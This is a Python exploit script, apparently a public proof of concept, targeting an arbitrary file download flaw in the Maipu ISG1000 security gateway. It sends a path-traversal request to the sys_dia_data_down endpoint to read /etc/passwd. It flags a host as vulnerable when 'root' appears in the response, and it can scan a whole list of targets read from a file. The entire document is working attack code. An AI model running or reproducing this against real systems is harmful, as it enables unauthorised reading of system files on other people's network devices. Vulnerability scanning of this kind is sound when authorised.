import requests
import argparse
import urllib3
import sys

from OpenSSL.SSL import SysCallError
from urllib3.exceptions import ProxyError

urllib3.disable_warnings()


def title():
    print("""
                               迈普_ISG1000安全网关_sys_dia_data_down_任意文件下载漏洞
                      use: python3  迈普_ISG1000安全网关_sys_dia_data_down_任意文件下载漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Connection': 'close'
        }
        # proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        try:
            requests.packages.urllib3.disable_warnings()
            etc_passwd = requests.get(self.url + "/webui/?g=sys_dia_data_down&file_name=../etc/passwd", headers=headers, verify=False, timeout=2)
            print(etc_passwd.url)
            rt = etc_passwd.text
            if "root" in rt and etc_passwd.status_code == 200:
                print("\033[32m[o]" + self.url + "存在迈普_ISG1000安全网关_sys_dia_data_down_任意文件下载漏洞！" + "\033[0m")
                # with open("迈普_ISG1000安全网关_sys_dia_data_down_任意文件下载漏洞.txt", mode="a") as rp:
                #     rp.write(self.url + "\n")
            # if requests.exceptions.SSLError:
            #     print("站点ssl证书连接错误！")
            #     pass
            # if requests.exceptions:
            #     print("站点HTTPS连接错误！")
            #     pass
            # if requests.exceptions.ConnectionError:
            #     print("站点连接错误！")
            #     pass
            # if requests.exceptions.ProxyError:
            #     print("站点代理连接错误！")
            #     pass
        except:
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="迈普_ISG1000安全网关_sys_dia_data_down_任意文件下载漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 迈普_ISG1000安全网关_sys_dia_data_down_任意文件下载漏洞.py -u http://127.0.0.1\neg2:>>>python3 迈普_ISG1000安全网关_sys_dia_data_down_任意文件下载漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
